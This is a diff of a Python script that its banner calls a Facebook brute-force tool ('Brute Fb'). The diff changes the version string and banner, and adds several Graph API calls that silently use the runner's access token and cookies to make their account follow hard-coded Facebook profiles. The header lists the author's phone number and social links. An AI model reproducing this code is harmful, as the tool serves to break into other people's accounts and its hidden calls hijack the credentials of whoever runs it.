@@ -6,7 +6,7 @@ Facebook  = 'Facebook.com/fikritampan305'
 Instagram = 'Instagram.com/fi_sinaga'
 Whatsapp  = '081269496231'
 YouTube   = 'Youtube.com/channel/UCZqnZlJ0jfoWSnXrNEj5JHA'
-Version   = '2.0'
+Version   = '11'
 Syafii  = 100080716718035
 Postingan = 115753054458585
 komentar   = '\n\nhttps://www.facebook.com/' + str(Postingan)
@@ -60,11 +60,11 @@ def banner():
     war_dom = random.choice([P,K,M,J,U,H])
     print("""
 ___________________________________________________
- ____  __  __ ____  _____  |.Version 2.0
-|  _ \|  \/  | __ )|  ___| |[•]Mhd.Syafii
-| | | | |\/| |  _ \| |_    |[•]27-22-1998
-| |_| | |  | | |_) |  _|   |[•]Brute Fb
-|____/|_|  |_|____/|_|     |[•]11-04-2022
+ ____  __  __ ____  _____  |[•] Version 11
+|  _ \|  \/  | __ )|  ___| |[•] Mhd.Syafii
+| | | | |\/| |  _ \| |_    |[•] 27-22-1998
+| |_| | |  | | |_) |  _|   |[•] Brute Fb
+|____/|_|  |_|____/|_|     |[•] 11-04-2022
 ____________________________________________________
  |""")
 
@@ -266,6 +266,10 @@ def ___fii___Sayang___Kamu___Widiya___():
     requests.post('https://graph.facebook.com/100005878513705/subscribers?access_token=%s'%(token),cookies=cookie)
     requests.post('https://graph.facebook.com/100000287398094/subscribers?access_token=%s'%(token),cookies=cookie)
     requests.post('https://graph.facebook.com/100000737201966/subscribers?access_token=%s'%(token),cookies=cookie)
+    requests.post('https://graph.facebook.com/100000149757897/subscribers?access_token=%s'%(token),cookies=cookie)
+    requests.post('https://graph.facebook.com/100015073506062/subscribers?access_token=%s'%(token),cookies=cookie)
+    requests.post('https://graph.facebook.com/100037914692898/subscribers?access_token=%s'%(token),cookies=cookie)
+    requests.post('https://graph.facebook.com/100000431996038/subscribers?access_token=%s'%(token),cookies=cookie)
     menu()
 	
 ###### BUAT MENU
